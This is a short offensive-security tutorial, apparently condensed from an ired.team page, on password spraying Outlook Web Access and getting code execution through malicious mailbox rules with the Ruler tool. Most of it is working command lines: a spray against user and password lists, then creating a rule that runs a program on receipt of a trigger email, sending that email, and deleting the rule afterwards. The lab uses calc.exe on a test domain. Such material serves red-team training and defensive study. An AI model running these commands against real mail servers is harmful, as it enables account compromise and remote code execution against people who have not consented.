# Password Spraying Outlook Web Access: Remote Shell

Source: https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell

## Context

Technique: Password spraying + abusing OWA via malicious email rules using `Ruler` tool to get remote shell.

## Password Spraying vs Brute Force

**Password Spraying**: Cycle through many usernames with few common passwords (avoids lockout)
| User | Password |
|------|---------|
| john | Winter2018 |
| ben | Winter2018 |
| ... | Winter2018 |
| john | December2018! |

**Brute Force**: Cycle all passwords per single username
| User | Password |
|------|---------|
| john | Winter2018 |
| john | Winter2018! |
| john | Password1 |

## Password Spraying Exchange/OWA

```bash
# Using Ruler
ruler --domain offense.local brute --users users.txt --passwords passwords.txt
```

Update `/etc/hosts` to point to Exchange server if needed.

## Getting Shell via Malicious Email Rule (Ruler)

### Process
1. Obtain valid creds via spray (e.g., `spotless@offense.local` / `123456`)
2. Create malicious mail rule with Ruler that triggers on email receipt
3. Rule executes payload when email arrives to compromised mailbox

### Create Malicious Rule
```bash
ruler --email spotless@offense.local --username spotless --password 123456 --domain offense.local   rule add --name "lolcat" --trigger "Ruler" --action "c:\windows\system32\calc.exe"
```

### Send Trigger Email
```bash
ruler --email spotless@offense.local --username spotless --password 123456 --domain offense.local   send --to spotless@offense.local --subject "Ruler" --body "exploit"
```

### Verify Rules
```bash
ruler --email spotless@offense.local --username spotless --password 123456 --domain offense.local   rule list
```

### Clean Up
```bash
ruler ... rule delete --name "lolcat"
```
